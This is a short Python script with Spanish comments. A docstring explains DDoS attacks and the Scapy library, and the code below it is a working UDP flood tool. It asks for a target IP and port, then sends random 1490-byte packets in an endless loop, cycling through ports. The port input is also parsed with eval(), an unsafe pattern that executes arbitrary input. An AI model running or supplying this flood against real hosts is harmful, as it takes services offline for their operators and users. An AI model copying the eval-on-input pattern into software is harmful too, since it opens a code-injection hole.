'''
Ataque DDoS (Distributed Denial Of Service): inundar de tráfico entrante al server víctima, para que no pueda
responder ningún tráfico legítimo, ya que está saturado por peticiones ilegítimas.
En el caso del DDoS, se realiza desde múltiples sitios, es decir, se utiliza (de forma común) una red de Bots,
o lo que es lo mismo, ordenadores y servidores contaminados que actúan como ZOMBIES y realizan un ataque en el
mismo momento que el resto.

SCAPY: módulo de manipulación de paquetes interactivos, o lo que es lo mismo, este módulo es capaz de
falsificar y decodificar paquetes de una amplia cantidad de protocolos, enviarlos por red, capturarlos, ç
almacenarlos o leerlos usando archivos pcap, hacer coincidir solicitudes y respuestas, y mucho más.

Está diseñado para permitir la creación rápida de prototipos de paquetes mediante el uso de valores
predeterminados que funcionen.

Scapy es compatible con Python 2.7 y Python 3 (3.4 a 3.9).
Está pensado para ser multiplataforma y se ejecuta en muchas plataformas diferentes
(Linux, OSX, BSD y Windows).
'''

# IMPORTS
import os # gestión de sistema operativo
import time # gestión de fechas y horas
import socket # creación y gestión de comunicaciones
import scapy.all as scapy # manipulación de paquetes
import random # produce números aleatorios

# Inicialización -------------------------------------------------------------------------------
# 1.- Fecha y hora
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# 2.- Socket y bytes para el ataque
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490) # generación de número aleatorio en base da fuentes del sistema

# Peticiones ------------------------------------------------------------------------------------
ip = input("Introduce IP objetivo: ")
port = eval(input("Introduce puerto: ")) # recibe un string, lo comprueba y lo devuelve como int

# Let's Play ------------------------------------------------------------------------------------
print(f"Comenzando ataque a la dirección {ip} en el puerto {port}...")

time.sleep(2) # tiempo de espera entre ejecuciones
sent = 0

while True:
    sock.sendto(bytes, (ip, port)) # se crea la comunicación enviando X bytes a la ip que sea en el puerto que hayamos dicho
    sent = sent + 1
    port = port + 1

    print(f"Paquete {sent} enviado a {ip} a través del puerto {port}.")
    if (port == 65534):
        port = 1

os.system("cls")
input("Presiona INTRO para salir...")